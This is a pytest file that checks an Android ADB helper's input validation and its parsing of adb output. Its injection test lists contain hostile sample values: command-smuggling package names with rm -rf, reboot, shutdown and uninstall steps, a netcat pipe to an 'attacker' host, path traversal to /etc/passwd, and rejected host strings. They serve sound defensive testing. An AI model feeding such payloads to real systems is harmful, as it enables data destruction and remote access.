"""
Tests for the ADB shell-injection guard in open_play_store.

A package name is interpolated into an `am start ... -d "market://..."` shell
command, so it must be validated before any device I/O happens.
"""

from __future__ import annotations

import pytest

from app.services.android import (
    _PACKAGE_RE,
    AndroidError,
    _adb_exe,
    _check_connect_result,
    _check_pair_result,
    _parse_getprop,
    _parse_mdns_connect,
    _validate_host,
    open_play_store,
    pair,
)

VALID = ["com.whatsapp", "com.google.android.youtube", "org.mozilla.firefox", "a.b.c"]
INJECTION = [
    'com.evil";reboot;"',
    "com.evil$(rm -rf /)",
    "com.evil && shutdown",
    "com.evil`id`",
    "com.evil;pm uninstall com.bank",
    "com.evil | nc attacker 4444",
    "../../etc/passwd",
    "",
    "com.evil app",  # space
]


@pytest.mark.parametrize("pkg", VALID)
def test_regex_accepts_valid_package_names(pkg):
    assert _PACKAGE_RE.match(pkg)


@pytest.mark.parametrize("pkg", INJECTION)
def test_regex_rejects_injection_payloads(pkg):
    assert not _PACKAGE_RE.match(pkg)


@pytest.mark.parametrize("pkg", INJECTION)
async def test_open_play_store_raises_before_any_io(pkg):
    # Must raise on validation, never attempt to connect to 10.255.255.255.
    with pytest.raises(AndroidError):
        await open_play_store("10.255.255.255", 5555, pkg)


# --- adb output parsing ---------------------------------------------------- #
def test_parse_getprop():
    out = (
        "[ro.product.model]: [SM-G991B]\n"
        "[ro.build.version.sdk]: [33]\n"
        "[ro.product.manufacturer]: [samsung]\n"
        "a garbage line with no brackets\n"
        "[ro.empty]: []"
    )
    props = _parse_getprop(out)
    assert props["ro.product.model"] == "SM-G991B"
    assert props["ro.build.version.sdk"] == "33"
    assert props["ro.product.manufacturer"] == "samsung"
    assert props["ro.empty"] == ""
    assert "a garbage line with no brackets" not in props


def test_check_pair_result_success():
    _check_pair_result(0, "Successfully paired to 192.168.1.5:37123 [guid: adb-XYZ]", "")


@pytest.mark.parametrize("out,err", [("", "Failed: wrong code"), ("", ""), ("nope", "boom")])
def test_check_pair_result_failure(out, err):
    with pytest.raises(AndroidError):
        _check_pair_result(1, out, err)


def test_check_connect_result_success():
    _check_connect_result(0, "connected to 192.168.1.5:5555", "")
    _check_connect_result(0, "already connected to 192.168.1.5:5555", "")


def test_check_connect_result_failure():
    with pytest.raises(AndroidError):
        _check_connect_result(1, "failed to connect to '1.2.3.4:5555'", "")


# --- host + pairing-code validation (before any subprocess) ---------------- #
@pytest.mark.parametrize("host", ["192.168.1.5", "10.0.0.1", "phone.local", "a-b.example"])
def test_validate_host_accepts(host):
    _validate_host(host)  # no raise


@pytest.mark.parametrize("host", ["", "-rf", "1.2.3.4; rm", "a b", "$(x)", "-s", "|nc"])
def test_validate_host_rejects(host):
    with pytest.raises(AndroidError):
        _validate_host(host)


@pytest.mark.parametrize("bad", ["12345", "1234567", "abcdef", "12 34", ""])
async def test_pair_rejects_bad_code_before_adb(bad):
    # A non-6-digit code must raise on validation, never spawn adb.
    with pytest.raises(AndroidError):
        await pair("192.168.1.5", 37123, bad)


async def test_pair_rejects_bad_host_before_adb():
    with pytest.raises(AndroidError):
        await pair("-evil", 37123, "123456")


def test_adb_exe_is_bundled_on_windows():
    import sys

    if sys.platform == "win32":
        assert _adb_exe() is not None  # vendored platform-tools\adb.exe


# --- mDNS connect-port discovery ------------------------------------------- #
_MDNS_SAMPLE = (
    "List of discovered mdns services\n"
    "adb-RFCW70YDHHB-hqcfQV\t_adb-tls-pairing._tcp\t192.168.3.30:34887\n"
    "adb-RFCW70YDHHB-hqcfQV\t_adb-tls-connect._tcp\t192.168.3.30:34677\n"
)


def test_parse_mdns_connect_finds_port():
    # Must pick the connect service's port, not the pairing one.
    assert _parse_mdns_connect(_MDNS_SAMPLE, "192.168.3.30") == 34677


def test_parse_mdns_connect_other_host_is_none():
    assert _parse_mdns_connect(_MDNS_SAMPLE, "192.168.3.99") is None


def test_parse_mdns_connect_empty_is_none():
    assert _parse_mdns_connect("List of discovered mdns services\n", "192.168.3.30") is None
